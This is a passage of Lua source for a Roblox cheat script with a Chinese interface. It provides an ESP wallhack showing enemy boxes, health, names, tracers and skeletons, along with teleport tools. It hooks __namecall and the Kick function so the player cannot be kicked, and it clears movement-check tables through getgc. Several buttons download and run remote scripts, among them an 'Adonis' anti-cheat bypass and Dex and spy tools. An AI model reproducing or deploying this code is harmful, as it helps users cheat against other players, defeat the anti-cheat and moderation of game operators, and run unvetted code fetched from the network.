healthText.Color = getBSCurrentColor(getgenv().BSESPConfig.HealthTextColor)
else
healthBar.Visible = false
healthBarBackground.Visible = false
healthText.Visible = false
end
if getgenv().BSESPConfig.ShowName and onScreen then
nameText.Position = Vector2.new(headPos.X, headPos.Y - 35)
nameText.Text = player.Name
nameText.Visible = true
nameText.Color = getBSCurrentColor(getgenv().BSESPConfig.NameColor)
if getgenv().BSESPConfig.ShowDistance then
local distance = (BSLocalPlayer.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
distanceText.Position = Vector2.new(headPos.X, headPos.Y + 10)
distanceText.Text = math.floor(distance) .. "m"
distanceText.Visible = true
distanceText.Color = getBSCurrentColor(getgenv().BSESPConfig.DistanceColor)
else
distanceText.Visible = false
end
if getgenv().BSESPConfig.ShowWeapon then
weaponText.Position = Vector2.new(headPos.X, headPos.Y - 50)
weaponText.Text = weaponName
weaponText.Visible = true
weaponText.Color = getBSCurrentColor(getgenv().BSESPConfig.WeaponColor)
else
weaponText.Visible = false
end
else
nameText.Visible = false
distanceText.Visible = false
weaponText.Visible = false
end
if getgenv().BSESPConfig.ShowTracer then
local head = character:FindFirstChild("Head")
if head then
local hPos, hOnScreen = BSCamera:WorldToViewportPoint(head.Position)
if hOnScreen then
tracer.From = Vector2.new(BSCamera.ViewportSize.X / 2, BSCamera.ViewportSize.Y)
tracer.To = Vector2.new(hPos.X, hPos.Y)
tracer.Visible = true
tracer.Color = getBSCurrentColor(getgenv().BSESPConfig.TracerColor)
tracer.Thickness = getgenv().BSESPConfig.TracerThickness
else
tracer.Visible = false
end
else
tracer.Visible = false
end
else
tracer.Visible = false
end
if getgenv().BSESPConfig.OutOfViewArrows and not onScreen then
local direction = (rootPart.Position - BSCamera.CFrame.Position).Unit
local dotProduct = BSCamera.CFrame.RightVector:Dot(direction)
local crossProduct = BSCamera.CFrame.RightVector:Cross(direction)
local screenPosition = Vector2.new(
BSCamera.ViewportSize.X / 2 + dotProduct * BSCamera.ViewportSize.X / 3,
BSCamera.ViewportSize.Y / 2 - crossProduct.Y * BSCamera.ViewportSize.Y / 3
)
screenPosition = Vector2.new(
math.clamp(screenPosition.X, getgenv().BSESPConfig.ArrowSize, BSCamera.ViewportSize.X - getgenv().BSESPConfig.ArrowSize),
math.clamp(screenPosition.Y, getgenv().BSESPConfig.ArrowSize, BSCamera.ViewportSize.Y - getgenv().BSESPConfig.ArrowSize)
)
local angle = math.atan2(screenPosition.Y - BSCamera.ViewportSize.Y / 2, screenPosition.X - BSCamera.ViewportSize.X / 2)
arrow.PointA = screenPosition
arrow.PointB = Vector2.new(screenPosition.X - getgenv().BSESPConfig.ArrowSize * math.cos(angle - 0.5), screenPosition.Y - getgenv().BSESPConfig.ArrowSize * math.sin(angle - 0.5))
arrow.PointC = Vector2.new(screenPosition.X - getgenv().BSESPConfig.ArrowSize * math.cos(angle + 0.5), screenPosition.Y - getgenv().BSESPConfig.ArrowSize * math.sin(angle + 0.5))
arrow.Color = getBSCurrentColor(getgenv().BSESPConfig.ArrowColor)
arrow.Visible = true
else
arrow.Visible = false
end
if getgenv().BSESPConfig.ShowSkeleton and onScreen then
local head = character:FindFirstChild("Head")
local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
local leftArm = character:FindFirstChild("Left Arm") or character:FindFirstChild("LeftUpperArm")
local rightArm = character:FindFirstChild("Right Arm") or character:FindFirstChild("RightUpperArm")
local leftLeg = character:FindFirstChild("Left Leg") or character:FindFirstChild("LeftUpperLeg")
local rightLeg = character:FindFirstChild("Right Leg") or character:FindFirstChild("RightUpperLeg")
local skeletonColor = getBSCurrentColor(getgenv().BSESPConfig.SkeletonColor)
if head and torso and leftArm and rightArm and leftLeg and rightLeg then
local connections = {
{head, torso}, {torso, leftArm}, {torso, rightArm},
{torso, leftLeg}, {torso, rightLeg}
}
for i, conn in ipairs(connections) do
local pos1 = BSCamera:WorldToViewportPoint(conn[1].Position)
local pos2 = BSCamera:WorldToViewportPoint(conn[2].Position)
skeletonLines[i].From = Vector2.new(pos1.X, pos1.Y)
skeletonLines[i].To = Vector2.new(pos2.X, pos2.Y)
skeletonLines[i].Color = skeletonColor
skeletonLines[i].Visible = true
end
for i = #connections + 1, 15 do
skeletonLines[i].Visible = false
end
else
for _, line in pairs(skeletonLines) do line.Visible = false end
end
else
for _, line in pairs(skeletonLines) do line.Visible = false end
end
end
comps.smoothHealth = smoothHealth
end

local function createBSESP(player)
local box
if not Drawing then return end
box = Drawing.new("Square")
box.Visible = false
box.Color = getgenv().BSESPConfig.BoxColor
box.Thickness = getgenv().BSESPConfig.BoxThickness
box.Filled = false
local box3D = {}
for i = 1, 12 do
box3D[i] = Drawing.new("Line")
box3D[i].Visible = false
box3D[i].Thickness = getgenv().BSESPConfig.BoxThickness
end
local healthBar = Drawing.new("Square")
healthBar.Visible = false
healthBar.Filled = true
local healthBarBackground = Drawing.new("Square")
healthBarBackground.Visible = false
healthBarBackground.Color = Color3.new(0, 0, 0)
healthBarBackground.Transparency = 0.5
healthBarBackground.Filled = true
local healthText = Drawing.new("Text")
healthText.Visible = false
healthText.Color = getgenv().BSESPConfig.HealthTextColor
healthText.Size = 14
healthText.Font = Drawing.Fonts.Monospace
healthText.Outline = true
healthText.OutlineColor = Color3.new(0, 0, 0)
local nameText = Drawing.new("Text")
nameText.Visible = false
nameText.Size = 16
nameText.Font = Drawing.Fonts.Monospace
nameText.Outline = true
nameText.OutlineColor = Color3.new(0, 0, 0)
local distanceText = Drawing.new("Text")
distanceText.Visible = false
distanceText.Size = 14
distanceText.Font = Drawing.Fonts.Monospace
distanceText.Outline = true
distanceText.OutlineColor = Color3.new(0, 0, 0)
local weaponText = Drawing.new("Text")
weaponText.Visible = false
weaponText.Size = 14
weaponText.Font = Drawing.Fonts.Monospace
weaponText.Outline = true
weaponText.OutlineColor = Color3.new(0, 0, 0)
local tracer = Drawing.new("Line")
tracer.Visible = false
tracer.Color = getgenv().BSESPConfig.TracerColor
tracer.Thickness = getgenv().BSESPConfig.TracerThickness
local arrow = Drawing.new("Triangle")
arrow.Visible = false
arrow.Filled = true
arrow.Thickness = 1
local skeletonLines = {}
for i = 1, 15 do
skeletonLines[i] = Drawing.new("Line")
skeletonLines[i].Visible = false
skeletonLines[i].Color = getgenv().BSESPConfig.SkeletonColor
skeletonLines[i].Thickness = getgenv().BSESPConfig.SkeletonThickness
end
BSESPComponents[player] = {
box = box, box3D = box3D, healthBar = healthBar,
healthBarBackground = healthBarBackground, healthText = healthText,
nameText = nameText, distanceText = distanceText, weaponText = weaponText,
tracer = tracer, arrow = arrow, skeletonLines = skeletonLines,
smoothHealth = 100,
}
end

for _, player in pairs(BSPlayers:GetPlayers()) do
if player ~= BSLocalPlayer then
createBSESP(player)
end
end
BSPlayers.PlayerAdded:Connect(function(player)
createBSESP(player)
end)

pcall(function()
BSRunService.RenderStepped:Connect(function()
updateBSGlobalDrawings()
updateBSRadar()
updateBSHighlights()
for player in pairs(BSESPComponents) do
updateBSEntity(player)
end
end)
end)

BSESPBox:AddToggle("BS_ESP_Enabled", { Text = "ESP总开关", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ESPEnabled = v
end)
BSESPBox:AddToggle("BS_ShowBox", { Text = "显示方框", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowBox = v
end)
BSESPBox:AddToggle("BS_Show3DBox", { Text = "显示3D方框", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.Show3DBox = v
end)
BSESPBox:AddToggle("BS_ShowHealth", { Text = "显示血量", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowHealth = v
end)
BSESPBox:AddToggle("BS_ShowName", { Text = "显示名称", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowName = v
end)
BSESPBox:AddToggle("BS_ShowDistance", { Text = "显示距离", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowDistance = v
end)
BSESPBox:AddToggle("BS_ShowTracer", { Text = "显示射线", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowTracer = v
end)
BSESPBox:AddToggle("BS_TeamCheck", { Text = "队伍检查", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.TeamCheck = v
end)

local BeautifyGroup = Tabs.Visual:AddRightGroupbox("美化包")

local function deleteAccessories(char)
char = char or getCharacter()
if not char then return end
for _, v in ipairs(char:GetChildren()) do
if v:IsA("Accessory") then
pcall(function() v:Destroy() end)
end
end
end

local function deleteAccessoriesAndClothes(char)
char = char or getCharacter()
if not char then return end
for _, v in ipairs(char:GetChildren()) do
if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v:IsA("BodyColors") then
pcall(function() v:Destroy() end)
end
end
for _, v in ipairs(char:GetDescendants()) do
if v:IsA("Decal") or v:IsA("Texture") then
pcall(function() v:Destroy() end)
end
end
end

local function randomColor(char)
char = char or getCharacter()
if not char then return end
for _, v in ipairs(char:GetChildren()) do
if v:IsA("BasePart") then
pcall(function()
v.BrickColor = BrickColor.Random()
v.Color = Color3.new(math.random(), math.random(), math.random())
end)
end
end
end

BeautifyGroup:AddButton("删除所有饰品", function()
deleteAccessories()
notify("美化", "已删除所有饰品", 3)
end)

local autoDeleteOnRespawn = false
BeautifyGroup:AddToggle("AutoDeleteOnRespawn", {
Text = "重生自动删除饰品和衣服",
Default = false
}):OnChanged(function(v)
autoDeleteOnRespawn = v
notify("美化", v and "已开启重生自动删除" or "已关闭重生自动删除", 3)
end)

BeautifyGroup:AddButton("删除所有饰品和衣服", function()
deleteAccessoriesAndClothes()
notify("美化", "已删除所有饰品和衣服", 3)
end)

BeautifyGroup:AddButton("角色随机颜色", function()
randomColor()
notify("美化", "已应用随机颜色", 3)
end)

local autoColorOnRespawn = false
BeautifyGroup:AddToggle("AutoColorOnRespawn", {
Text = "重生自动应用随机颜色",
Default = false
}):OnChanged(function(v)
autoColorOnRespawn = v
notify("美化", v and "已开启重生随机颜色" or "已关闭重生随机颜色", 3)
end)

local rainbowOn = false
local rainbowConn = nil
BeautifyGroup:AddToggle("RainbowCharacter", {
Text = "彩虹角色 (Neon循环变色)",
Default = false
}):OnChanged(function(v)
rainbowOn = v
if v then
notify("美化", "已开启彩虹角色", 3)
local hue = 0
pcall(function()
if rainbowConn then rainbowConn:Disconnect() end
rainbowConn = RunService.Heartbeat:Connect(function()
if not rainbowOn then return end
hue = hue + 0.005
if hue > 1 then hue = 0 end
local color = Color3.fromHSV(hue, 1, 1)
local char = getCharacter()
if char then
for _, part in ipairs(char:GetChildren()) do
if part:IsA("BasePart") then
pcall(function()
part.Color = color
part.Material = Enum.Material.Neon
end)
end
end
end
end)
end)
else
notify("美化", "已关闭彩虹角色", 3)
if rainbowConn then
rainbowConn:Disconnect()
rainbowConn = nil
end

local char = getCharacter()
if char then
for _, part in ipairs(char:GetChildren()) do
if part:IsA("BasePart") then
pcall(function() part.Material = Enum.Material.Plastic end)
end
end
end
end
end)

local brokenLegOn = false
local function applyKorblox(char)
char = char or getCharacter()
if not char then return end
local rightLeg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLeg")
if not rightLeg then return end
local existing = rightLeg:FindFirstChildOfClass("SpecialMesh")
if existing then existing:Destroy() end
local mesh = Instance.new("SpecialMesh")
mesh.MeshId = "rbxassetid://6658418826"
mesh.TextureId = "rbxassetid://6658420819"
mesh.Scale = Vector3.new(1, 1, 1)
mesh.VertexColor = Vector3.new(1, 1, 1)
mesh.Parent = rightLeg
end

local function removeKorblox(char)
char = char or getCharacter()
if not char then return end
local rightLeg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLeg")
if not rightLeg then return end
local mesh = rightLeg:FindFirstChildOfClass("SpecialMesh")
if mesh then mesh:Destroy() end
end

BeautifyGroup:AddToggle("BrokenLeg", {
Text = "断腿 (Korblox右腿)",
Default = false
}):OnChanged(function(v)
brokenLegOn = v
if v then
applyKorblox()
notify("美化", "已应用断腿", 3)
else
removeKorblox()
notify("美化", "已恢复右腿", 3)
end
end)

local headlessOn = false
local originalHeadTransparency = 0
BeautifyGroup:AddToggle("Headless", {
Text = "无头 (头部透明)",
Default = false
}):OnChanged(function(v)
headlessOn = v
local char = getCharacter()
if not char then return end
local head = char:FindFirstChild("Head")
if not head then return end
if v then
originalHeadTransparency = head.Transparency
pcall(function()
head.Transparency = 1
for _, d in ipairs(head:GetChildren()) do
if d:IsA("Decal") or d:IsA("Texture") then
d:Destroy()
end
end
end)
notify("美化", "已应用无头", 3)
else
pcall(function()
head.Transparency = originalHeadTransparency
end)
notify("美化", "已恢复头部", 3)
end
end)

LocalPlayer.CharacterAdded:Connect(function(char)
task.wait(0.5)
if autoDeleteOnRespawn then
deleteAccessoriesAndClothes(char)
end
if autoColorOnRespawn then
randomColor(char)
end
if brokenLegOn then
applyKorblox(char)
end
if headlessOn then
pcall(function()
local head = char:FindFirstChild("Head")
if head then
originalHeadTransparency = head.Transparency
head.Transparency = 1
for _, d in ipairs(head:GetChildren()) do
if d:IsA("Decal") or d:IsA("Texture") then
d:Destroy()
end
end
end
end)
end
end)
local BSESPRightBox = Tabs.Visual:AddRightGroupbox("其他设置")
BSESPRightBox:AddToggle("BS_ShowSkeleton", { Text = "显示骨骼", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowSkeleton = v
end)
BSESPRightBox:AddToggle("BS_ShowRadar", { Text = "显示雷达", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowRadar = v
end)
BSESPRightBox:AddToggle("BS_ShowPlayerCount", { Text = "显示玩家计数", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowPlayerCount = v
end)
BSESPRightBox:AddToggle("BS_ShowWeapon", { Text = "显示武器", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.ShowWeapon = v
end)
BSESPRightBox:AddToggle("BS_RainbowMode", { Text = "彩虹色模式", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.RainbowMode = v
end)
BSESPRightBox:AddToggle("BS_HighlightPlayers", { Text = "高亮玩家", Default = false }):OnChanged(function(v)
getgenv().BSESPConfig.HighlightPlayers = v
end)
end)

local Players       = game:GetService("Players")
local RunService    = game:GetService("RunService")
local Lighting      = game:GetService("Lighting")
local StarterGui    = game:GetService("StarterGui")
local VirtualUser   = game:GetService("VirtualUser")
local LocalPlayer    = Players.LocalPlayer

local _newcclosure = newcclosure or function(f) return f end
local _getrawmetatable = getrawmetatable or getmetatable
local _setreadonly = setreadonly or function(mt, _state) end
local _isreadonly = isreadonly or function() return false end
local _hookmetamethod = hookmetamethod
local _hookfunction = hookfunction
local _getnamecallmethod = getnamecallmethod
local _checkcaller = checkcaller
local _getgc = getgc

local function Notify(title, text, duration)
duration = duration or 3
pcall(function()
StarterGui:SetCore("SendNotification", {
Title = title,
Text = text,
Duration = duration
})
end)
end

local function getCharacterRoot()
local char = LocalPlayer.Character
if not char then return nil, nil end
local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
return char, root
end

local NightVisionBox = Tabs.Main:AddLeftGroupbox("夜视功能")

local nightVisionEnabled  = false
local nightVisionConn      = nil
local originalLighting      = {}

local function saveOriginalLighting()
originalLighting.ClockTime           = Lighting.ClockTime
originalLighting.Brightness          = Lighting.Brightness
originalLighting.ExposureCompensation= Lighting.ExposureCompensation
originalLighting.Ambient             = Lighting.Ambient
originalLighting.OutdoorAmbient      = Lighting.OutdoorAmbient
originalLighting.GlobalShadows       = Lighting.GlobalShadows
end

local function restoreOriginalLighting()
pcall(function()
Lighting.ClockTime            = originalLighting.ClockTime            or 14
Lighting.Brightness           = originalLighting.Brightness           or 2
Lighting.ExposureCompensation = originalLighting.ExposureCompensation or 0
Lighting.Ambient              = originalLighting.Ambient             or Color3.fromRGB(128, 128, 128)
Lighting.OutdoorAmbient       = originalLighting.OutdoorAmbient      or Color3.fromRGB(128, 128, 128)
Lighting.GlobalShadows       = originalLighting.GlobalShadows
end)
end

NightVisionBox:AddToggle("NightVisionToggle", {
Text    = "夜视模式",
Default = false,
}):OnChanged(function(v)
nightVisionEnabled = v
if v then
saveOriginalLighting()
if nightVisionConn then nightVisionConn:Disconnect() end
nightVisionConn = RunService.RenderStepped:Connect(function()
Lighting.ClockTime            = 15
Lighting.Brightness           = 2
Lighting.ExposureCompensation = 0.5
Lighting.Ambient              = Color3.fromRGB(255, 255, 255)
Lighting.OutdoorAmbient       = Color3.fromRGB(255, 255, 255)
end)
Notify("夜视", "夜视模式已开启", 3)
else
if nightVisionConn then
nightVisionConn:Disconnect()
nightVisionConn = nil
end
restoreOriginalLighting()
Notify("夜视", "夜视模式已关闭，已恢复原值", 3)
end
end)
local AntiVoidBox = Tabs.Main:AddLeftGroupbox("防虚空")

local antiVoidThreshold = -100
AntiVoidBox:AddSlider("AntiVoid_Threshold", {
Text = "触发高度(Y轴)",
Default = -100,
Min = -1000,
Max = 0,
Rounding = 0,
}):OnChanged(function(val)
antiVoidThreshold = val
end)

local bsAntiVoid = {
_enabled = false,
_loop = nil,
_voidY = -100,
_platform = nil,
}

function bsAntiVoid:_createPlatform()
if self._platform then
self._platform:Destroy()
end
self._platform = Instance.new("Part")
self._platform.Name = "AntiVoidPlatform"
self._platform.Size = Vector3.new(50, 2, 50)
self._platform.Anchored = true
self._platform.CanCollide = true
self._platform.Material = Enum.Material.Plastic
self._platform.Transparency = 0.9
self._platform.BrickColor = BrickColor.new("Institutional white")
self._platform.Parent = workspace
end

function bsAntiVoid:_core()
self._voidY = antiVoidThreshold
local character = LocalPlayer.Character
if not character then return end
local rootPart = character:FindFirstChild("HumanoidRootPart")
local humanoid = character:FindFirstChildOfClass("Humanoid")
if rootPart and humanoid and humanoid.Health > 0 then
if rootPart.Position.Y < self._voidY then

if not self._platform then
self:_createPlatform()
end

self._platform.Position = Vector3.new(
rootPart.Position.X,
self._voidY - 5,
rootPart.Position.Z
)

rootPart.CFrame = CFrame.new(rootPart.Position.X, self._voidY + 3, rootPart.Position.Z)
rootPart.Velocity = Vector3.new(0, 0, 0)
else

if self._platform then
self._platform:Destroy()
self._platform = nil
end
end
else

if self._platform then
self._platform:Destroy()
self._platform = nil
end
end
end

function bsAntiVoid:enable()
self._enabled = true
if self._loop then self._loop:Disconnect() end
self._loop = RunService.RenderStepped:Connect(function()
self:_core()
end)

LocalPlayer.CharacterAdded:Connect(function(newChar)
newChar:WaitForChild("HumanoidRootPart")
if self._enabled and not self._loop then
self:enable()
end
end)
Notify("防虚空", "防虚空已开启, 触发高度: " .. self._voidY, 3)
end

function bsAntiVoid:disable()
self._enabled = false
if self._loop then
self._loop:Disconnect()
self._loop = nil
end
if self._platform then
self._platform:Destroy()
self._platform = nil
end
Notify("防虚空", "防虚空已关闭", 3)
end

AntiVoidBox:AddToggle("AntiVoidToggle", {
Text    = "防虚空掉落",
Default = false,
}):OnChanged(function(state)
if state then
bsAntiVoid:enable()
else
bsAntiVoid:disable()
end
end)

local OptimizeBox = Tabs.Main:AddLeftGroupbox("防卡顿优化")

local optimizeEnabled   = false
local optimizeOriginal   = {}
local disabledParticles  = {}

local function applyOptimization()

optimizeOriginal.GlobalShadows = Lighting.GlobalShadows
Lighting.GlobalShadows = false

optimizeOriginal.PostEffects = {}
for _, obj in ipairs(Lighting:GetChildren()) do
if obj:IsA("PostEffect")
or obj:IsA("BloomEffect")
or obj:IsA("ColorCorrectionEffect")
or obj:IsA("SunRaysEffect")
or obj:IsA("BlurEffect")
or obj:IsA("DepthOfFieldEffect") then
table.insert(optimizeOriginal.PostEffects, {obj = obj, enabled = obj.Enabled})
obj.Enabled = false
end
end

pcall(function()
if workspace.StreamingEnabled then
optimizeOriginal.StreamingTargetRadius = workspace.StreamingTargetRadius
workspace.StreamingTargetRadius = 50
optimizeOriginal.StreamingMinRadius = workspace.StreamingMinRadius
workspace.StreamingMinRadius = 50
end
end)

disabledParticles = {}
for _, obj in ipairs(workspace:GetDescendants()) do
if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then
if obj.Enabled then
table.insert(disabledParticles, obj)
obj.Enabled = false
end
end
end
end

local function restoreOptimization()
pcall(function()
Lighting.GlobalShadows = optimizeOriginal.GlobalShadows
end)
if optimizeOriginal.PostEffects then
for _, entry in ipairs(optimizeOriginal.PostEffects) do
pcall(function() entry.obj.Enabled = entry.enabled end)
end
optimizeOriginal.PostEffects = {}
end
pcall(function()
if workspace.StreamingEnabled then
if optimizeOriginal.StreamingTargetRadius then workspace.StreamingTargetRadius = optimizeOriginal.StreamingTargetRadius end
if optimizeOriginal.StreamingMinRadius then workspace.StreamingMinRadius = optimizeOriginal.StreamingMinRadius end
end
end)
for _, obj in ipairs(disabledParticles) do
pcall(function() obj.Enabled = true end)
end
disabledParticles = {}
end

OptimizeBox:AddToggle("OptimizeToggle", {
Text    = "性能优化",
Default = false,
}):OnChanged(function(v)
optimizeEnabled = v
if v then
applyOptimization()
Notify("防卡顿优化", "优化已开启", 3)
else
restoreOptimization()
Notify("防卡顿优化", "已恢复原设置", 3)
end
end)

local AntiKickBox = Tabs.Main:AddRightGroupbox("防踢功能")

local antiKickApplied = false

local function setupAntiKick()
if antiKickApplied then
Notify("防踢", "防踢已启用，无需重复", 3)
return
end

local ok1 = false

if _hookmetamethod then
ok1 = pcall(function()
local oldNamecall
oldNamecall = _hookmetamethod(game, "__namecall", _newcclosure(function(self, ...)
local method = _getnamecallmethod and _getnamecallmethod() or ""
if method == "Kick" then
local isCaller = _checkcaller and _checkcaller()
if not isCaller then
Notify("防踢", "拦截 __namecall Kick 调用", 4)
return nil
end
end
return oldNamecall(self, ...)
end))
end)
end

local ok2 = false
if _hookfunction then
ok2 = pcall(function()
local oldKick
oldKick = _hookfunction(LocalPlayer.Kick, _newcclosure(function(...)
Notify("防踢", "拦截 LocalPlayer.Kick 调用", 4)
return nil
end))
end)
end

if ok1 or ok2 then
antiKickApplied = true
Notify("防踢", "防踢已启用，将拦截所有Kick调用", 4)
else
Notify("防踢", "防踢启用失败，执行器可能不支持", 4)
end
end

AntiKickBox:AddButton("启用防踢", function()
setupAntiKick()
end)

local BypassBox = Tabs.Main:AddRightGroupbox("绕过功能")

BypassBox:AddButton("绕过反作弊(Adonis)", function()
local ok, err = pcall(function()
safeLoad("https://raw.githubusercontent.com/.../adoniscries.lua")
end)
if ok then
Notify("绕过", "绕过反作弊脚本已加载", 3)
else
Notify("绕过", "加载失败: " .. tostring(err), 4)
end
end)

local walkSpeedProtected = false

BypassBox:AddButton("绕过移动检测", function()
local cleared = 0

if _getgc then
pcall(function()
local keys = {"restrictTeleport", "checkCFrame", "validateMove", "restrictMove"}
for _, v in ipairs(_getgc()) do
if type(v) == "table" then
for _, key in ipairs(keys) do
if rawget(v, key) ~= nil then
pcall(function()
rawset(v, key, nil)
end)
cleared = cleared + 1
end
end
end
end
end)
end

if not walkSpeedProtected then
walkSpeedProtected = true
task.spawn(function()
while walkSpeedProtected do
pcall(function()
local char, root = getCharacterRoot()
if char then
local hum = char:FindFirstChildOfClass("Humanoid")
if hum and hum.WalkSpeed < 16 then
hum.WalkSpeed = 16
end
end
end)
task.wait(0.5)
end
end)
end

Notify("绕过", string.format("移动检测已绕过(清理%d项)，WalkSpeed保护已开启", cleared), 4)
end)

do
local Tabs_Tools = Window:AddTab("工具", "wrench")


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local CoordDropdown
local selectedCoord = ""

local SavedCoords = {}
local coordCounter = 0

local function notify(title, text, duration)
duration = duration or 3
pcall(function()
StarterGui:SetCore("SendNotification", {
Title = title,
Text = text,
Duration = duration
})
end)
end

local function getCharacter()
return LocalPlayer.Character
end

local function getRootPart()
local char = getCharacter()
if char then
return char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
end
end

local function getHumanoid()
local char = getCharacter()
if char then
return char:FindFirstChildOfClass("Humanoid")
end
end

local function refreshCoordDropdown()
local names = {}
for name in pairs(SavedCoords) do
table.insert(names, name)
end
table.sort(names)
if CoordDropdown then
CoordDropdown:SetValues(names)
end
end

local CoordGroup = Tabs_Tools:AddLeftGroupbox("坐标管理")

CoordGroup:AddButton("保存当前坐标", function()
local root = getRootPart()
if not root then
notify("坐标", "未找到角色", 3)
return
end
coordCounter = coordCounter + 1
local name = "coord" .. coordCounter
SavedCoords[name] = root.Position
notify("坐标保存", name .. " 已保存: " .. tostring(root.Position), 3)
refreshCoordDropdown()
end)

local customCoordInput = CoordGroup:AddInput("CustomCoordName", {
Text = "自定义坐标名",
Default = "",
Numeric = false
})

local customCoordName = ""
customCoordInput:OnChanged(function(text)
customCoordName = text or ""
end)

CoordGroup:AddButton("保存自定义坐标", function()
local root = getRootPart()
if not root then
notify("坐标", "未找到角色", 3)
return
end
local name = customCoordName
if not name or name == "" then
notify("坐标", "请输入坐标名称", 3)
return
end
SavedCoords[name] = root.Position
notify("坐标保存", name .. " 已保存", 3)
refreshCoordDropdown()
end)

CoordGroup:AddLabel("已保存坐标列表")

CoordDropdown = CoordGroup:AddDropdown("CoordList", {
Text = "坐标列表",
Values = {},
Default = "",
Multi = false
})

CoordDropdown:OnChanged(function(v)
selectedCoord = v
end)

CoordGroup:AddButton("传送到选中坐标", function()
if selectedCoord == "" or not SavedCoords[selectedCoord] then
notify("传送", "请选择有效坐标", 3)
return
end
local root = getRootPart()
if not root then
notify("传送", "未找到角色", 3)
return
end
root.CFrame = CFrame.new(SavedCoords[selectedCoord])
notify("传送", "已传送到 " .. selectedCoord, 3)
end)

local loopTeleport = false
local loopConn = nil
CoordGroup:AddToggle("LoopTeleport", {
Text = "循环传送选中坐标",
Default = false
}):OnChanged(function(v)
loopTeleport = v
if v then
notify("循环传送", "已开启循环传送", 3)
pcall(function()
if loopConn then loopConn:Disconnect() end
loopConn = RunService.Heartbeat:Connect(function()
if loopTeleport and selectedCoord ~= "" and SavedCoords[selectedCoord] then
local root = getRootPart()
if root then
root.CFrame = CFrame.new(SavedCoords[selectedCoord])
end
end
end)
end)
else
notify("循环传送", "已关闭循环传送", 3)
if loopConn then
loopConn:Disconnect()
loopConn = nil
end
end
end)

local TeleportGroup = Tabs_Tools:AddLeftGroupbox("传送工具")

TeleportGroup:AddButton("点击传送", function()
pcall(function()

for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
if item:IsA("Tool") and item.Name == "[XJW]传送工具" then
item:Destroy()
end
end

local tool = Instance.new("Tool")
tool.Name = "[XJW]传送工具"
tool.RequiresHandle = false
tool.ToolTip = "点击任意位置传送"
tool.Parent = LocalPlayer.Backpack

tool.Activated:Connect(function()
local root = getRootPart()
local char = getCharacter()
if not root or not char then return end

local mouse = LocalPlayer:GetMouse()
local rayParams = RaycastParams.new()
rayParams.FilterDescendantsInstances = { char }
rayParams.FilterType = Enum.RaycastFilterType.Exclude

local origin = mouse.UnitRay.Origin
local direction = mouse.UnitRay.Direction * 1000
local result = Workspace:Raycast(origin, direction, rayParams)

if result then
root.CFrame = CFrame.new(result.Position + Vector3.new(0, 3, 0))
notify("传送", "已传送到点击位置", 2)
else
root.CFrame = mouse.Hit
notify("传送", "已传送到点击位置", 2)
end
end)

notify("传送工具", "[XJW]传送工具 已创建，装备后点击传送", 4)
end)
end)

local CoordToolGroup = Tabs_Tools:AddRightGroupbox("坐标工具")

CoordToolGroup:AddButton("保存坐标到文件", function()
pcall(function()
local data = {}
for name, pos in pairs(SavedCoords) do
table.insert(data, string.format('["%s"] = Vector3.new(%f, %f, %f)', name, pos.X, pos.Y, pos.Z))
end
local content = "return {\n  " .. table.concat(data, ",\n  ") .. "\n}"
writefile("SavedCoords.txt", content)
setclipboard(content)
notify("坐标", "已保存到文件并复制到剪贴板", 4)
end)
end)

CoordToolGroup:AddButton("删除选中坐标", function()
if selectedCoord == "" or not SavedCoords[selectedCoord] then
notify("坐标", "请选择有效坐标", 3)
return
end
SavedCoords[selectedCoord] = nil
notify("坐标", "已删除 " .. selectedCoord, 3)
refreshCoordDropdown()
end)

CoordToolGroup:AddButton("删除全部坐标", function()
SavedCoords = {}
coordCounter = 0
selectedCoord = ""
refreshCoordDropdown()
notify("坐标", "已删除全部坐标", 3)
end)

CoordToolGroup:AddButton("复制当前坐标", function()
local root = getRootPart()
if not root then
notify("坐标", "未找到角色", 3)
return
end
local pos = root.Position
local text = string.format("%f, %f, %f", pos.X, pos.Y, pos.Z)
setclipboard(text)
notify("坐标", "当前坐标已复制: " .. text, 4)
end)


local IYBox = Tabs_Tools:AddRightGroupbox("IY指令")
IYBox:AddButton("执行Dex", function()
safeLoad("https://github.com/AZYsGithub/DexPlusPlus/releases/latest/download/out.lua")
end)

IYBox:AddButton("执行rspy", function()
safeLoad("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua")
end)

IYBox:AddButton("执行Cspy", function()
safeLoad("https://gitlab.com/upio/cobalt/-/releases/permalink/latest/downloads/Cobalt.luau")
end)

IYBox:AddButton("执行mdex", function()
safeLoad("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua")
end)

local ActionBoxR = Tabs.Function:AddRightGroupbox("动作功能")

ActionBoxR:AddButton("R6动作包", function()
pcall(function()
safeLoad("https://raw.githubusercontent.com/GreenNumber42/Roblox-Scripts/main/R6Animations.lua")
end)
notify("动作", "正在加载R6动作包", 3)
end)

ActionBoxR:AddButton("动作V2", function()
pcall(function()
safeLoad("https://raw.githubusercontent.com/GreenNumber42/Roblox-Scripts/main/EmotesV2.lua")
end)
notify("动作", "正在加载动作V2", 3)
end)

